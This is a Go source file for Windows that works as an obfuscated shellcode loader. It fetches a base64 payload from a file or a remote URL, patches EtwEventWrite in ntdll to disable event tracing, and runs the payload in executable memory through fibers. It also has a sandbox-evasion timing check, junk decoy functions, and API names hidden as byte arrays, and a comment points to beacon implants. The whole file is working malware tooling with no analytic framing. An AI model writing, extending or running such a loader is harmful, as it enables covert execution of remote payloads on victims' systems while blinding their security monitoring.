package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func xcbrf8q() int {
	ch := make(chan int, 1)
	ch <- 598
	return <-ch
}

func nz5zcsbkahkr() []int {
	s := make([]int, 12)
	for i := range s {
		s[i] = i * 6 + 29
	}
	return s
}

func bihwqubcc() []int {
	s := make([]int, 11)
	for i := range s {
		s[i] = i * 3 + 87
	}
	return s
}

func khxox7rrzd() int {
	x := 0
	for i := 0; i < 76; i++ {
		x += i * 7
	}
	return x
}

func tpe07jfb5a(n string) *windows.LazyDLL {
	return windows.NewLazySystemDLL(n)
}

func jljsykpcepyl() {
	h7ntm2tt := tpe07jfb5a(string([]byte{110,116,100,108,108,46,100,108,108}))
	yy1a1179exwvj := h7ntm2tt.NewProc(string([]byte{69,116,119,69,118,101,110,116,87,114,105}) + string([]byte{116,101}))
	yy1a1179exwvj.Find()
	patch := []byte{0xC3} // ret
	var freehp26frxf2 uint32
	yf2lc4px3v70 := tpe07jfb5a(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
	vp := yf2lc4px3v70.NewProc(string([]byte{86,105,114,116}) + string([]byte{117,97,108,80,114,111,116}) + string([]byte{101,99,116}))
	vp.Call(yy1a1179exwvj.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&freehp26frxf2)))
	*(*byte)(unsafe.Pointer(yy1a1179exwvj.Addr())) = patch[0]
	vp.Call(yy1a1179exwvj.Addr(), 1, uintptr(freehp26frxf2), uintptr(unsafe.Pointer(&freehp26frxf2)))
}

func lzrs61x7d4() bool {
	otr91az := time.Now()
	time.Sleep(3943 * time.Millisecond)
	mo3rs017aj := time.Since(otr91az)
	return mo3rs017aj.Milliseconds() >= 3643
}

func j4j4ro9tq7a(url string) ([]byte, error) {
	h3paty2k := &http.Client{Timeout: 30 * time.Second}
	lsnn31rpur, err := h3paty2k.Get(url)
	if err != nil {
		return nil, err
	}
	defer lsnn31rpur.Body.Close()
	return ioutil.ReadAll(lsnn31rpur.Body)
}

func jhcldudl(p string) ([]byte, error) {
	return ioutil.ReadFile(p)
}

func q1rzivj6(data []byte) ([]byte, error) {
	return base64.StdEncoding.DecodeString(string(data))
}

func pzapjog92(data []byte) []byte {
	key := byte(10)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key
	}
	return out
}

func ljjilku8eylzs(qtt59l3m962nu []byte) {
	// Patch ETW before execution
	jljsykpcepyl()

	yf2lc4px3v70 := tpe07jfb5a(string([]byte{107,101,114,110,101,108,51,50,46,100,108,108}))
	h7ntm2tt := tpe07jfb5a(string([]byte{110,116,100,108,108,46,100,108,108}))

	f8s3map := yf2lc4px3v70.NewProc(string([]byte{86}) + string([]byte{105,114,116,117,97,108}) + string([]byte{65,108,108}) + string([]byte{111,99}))
	jngstkm68 := yf2lc4px3v70.NewProc(string([]byte{86,105,114,116}) + string([]byte{117,97,108,80,114,111,116}) + string([]byte{101,99,116}))
	kpsc6incd828v := h7ntm2tt.NewProc(string([]byte{82,116,108,77,111,118}) + string([]byte{101,77,101,109,111,114}) + string([]byte{121}))

	rvojjb6w := uintptr(len(qtt59l3m962nu))

	// Allocate RW memory
	nbd13ldz2gu, _, _ := f8s3map.Call(0, rvojjb6w, 0x3000, 0x04)
	if nbd13ldz2gu == 0 {
		return
	}

	// XOR encode in-memory then copy (forces unique memory pattern)
	ahkhd939h3 := pzapjog92(pzapjog92(qtt59l3m962nu))

	// Copy shellcode
	kpsc6incd828v.Call(nbd13ldz2gu, uintptr(unsafe.Pointer(&ahkhd939h3[0])), rvojjb6w)

	// Change to RX
	var freehp26frxf2 uint32
	jngstkm68.Call(nbd13ldz2gu, rvojjb6w, 0x20, uintptr(unsafe.Pointer(&freehp26frxf2)))

	np95rbt24h := yf2lc4px3v70.NewProc(string([]byte{67,111,110,118,101,114}) + string([]byte{116,84,104,114,101,97,100}) + string([]byte{84,111,70}) + string([]byte{105,98,101,114}))
	kq3valoab51e := yf2lc4px3v70.NewProc(string([]byte{67,114,101,97,116,101,70,105,98}) + string([]byte{101,114}))
	j45yc06xy := yf2lc4px3v70.NewProc(string([]byte{83,119,105,116,99,104,84}) + string([]byte{111,70,105,98}) + string([]byte{101,114}))

	time.Sleep(time.Duration(rand.Intn(1886)) * time.Millisecond)

	// Convert current thread to fiber, create shellcode fiber, switch
	np95rbt24h.Call(0)
	kmul3ehz, _, _ := kq3valoab51e.Call(0, nbd13ldz2gu, 0)
	if kmul3ehz != 0 {
		j45yc06xy.Call(kmul3ehz)
	}

	// Keep alive for beacon shellcode that spawns threads
	select {}
}

func main() {
	xxgk4wbtl9p := flag.String("local", "", "local path")
	biiki9liy2 := flag.String("remote", "", "remote url")
	flag.Parse()

	if !lzrs61x7d4() {
		os.Exit(0)
	}

	var clvvj55n93e5r []byte
	var err error

	if *xxgk4wbtl9p != "" {
		clvvj55n93e5r, err = jhcldudl(*xxgk4wbtl9p)
	} else if *biiki9liy2 != "" {
		clvvj55n93e5r, err = j4j4ro9tq7a(*biiki9liy2)
	} else {
		fmt.Println("Usage: -local <path> | -remote <url>")
		os.Exit(1)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
		os.Exit(1)
	}

	var fmx4smwf9 []byte
	fmx4smwf9, err = q1rzivj6(clvvj55n93e5r)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
		os.Exit(1)
	}

	ljjilku8eylzs(fmx4smwf9)
}
